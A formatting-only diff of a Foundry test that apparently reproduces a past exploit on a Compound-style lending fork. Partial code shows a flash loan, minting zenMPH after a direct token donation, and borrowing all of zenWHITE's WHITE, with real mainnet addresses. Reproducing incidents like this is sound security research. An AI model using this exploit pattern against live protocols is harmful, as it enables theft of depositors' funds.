@@ -17,9 +17,8 @@ contract ContractTest is Test {
     ICErc20Delegate zenWHITE = ICErc20Delegate(0xE3334e66634acF17B2b97ab560ec92D6861b25fa);
     ICErc20Delegate zenMPH = ICErc20Delegate(0x4dD6D5D861EDcD361455b330fa28c4C9817dA687);
 
-    function setUp() external 
-    {
-        vm.createSelectFork("mainnet", 20541640 - 1);
+    function setUp() external {
+        vm.createSelectFork("mainnet", 20_541_640 - 1);
         vm.label(address(WHITE), "WHITE");
         vm.label(address(MPH), "MPH");
         vm.label(address(Pool), "Pool");
@@ -30,7 +29,7 @@ contract ContractTest is Test {
 
     function testExploit() external {
         vm.prank(0x90744C976F69c7d112E8Fe85c750ACe2a2c16f15);
-        MPH.transfer(attacker, 23200 ether);
+        MPH.transfer(attacker, 23_200 ether);
         Pool.flash(attacker, 85 ether, 0, "");
     }
 
@@ -40,7 +39,7 @@ contract ContractTest is Test {
         unitroller.enterMarkets(cTokens);
         MPH.approve(address(zenMPH), type(uint256).max);
         MPH.transfer(address(zenMPH), 2000 ether);
-        zenMPH.mint(21200 ether);
+        zenMPH.mint(21_200 ether);
 
         uint256 WHITEBal = WHITE.balanceOf(attacker);
         WHITE.transfer(address(zenWHITE), WHITEBal);
@@ -49,7 +48,6 @@ contract ContractTest is Test {
         uint256 borrowAmount = WHITE.balanceOf(address(zenWHITE));
         zenWHITE.borrow(borrowAmount);
 
-        WHITE.transfer(address(Pool), WHITEBal+fee0);
+        WHITE.transfer(address(Pool), WHITEBal + fee0);
     }
 }
-
